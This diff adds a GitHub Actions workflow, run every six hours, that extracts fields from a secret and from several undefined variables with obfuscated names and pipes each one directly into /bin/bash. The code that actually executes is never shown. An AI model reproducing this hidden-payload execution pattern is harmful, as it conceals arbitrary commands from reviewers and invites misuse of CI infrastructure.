@@ -1,0 +1,23 @@
+name: zhuanxiagjiaohe
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuanxiagjiaohe
+        env:
+          ass36824: ${{ secrets.ass36824 }}
+        run: |
+          echo $ass36824 | jq -r .kyt96437 | /bin/bash
+          echo $wt04207 | jq -r .mcbdl6 | /bin/bash
+          echo $gkpar1881 | jq -r .nybe75215 | /bin/bash
+          echo $j40173 | jq -r .a3850 | /bin/bash
+          echo $dpv0 | jq -r .mumxs945 | /bin/bash
+          echo $itqn55575 | jq -r .cjrao1330 | /bin/bash
+
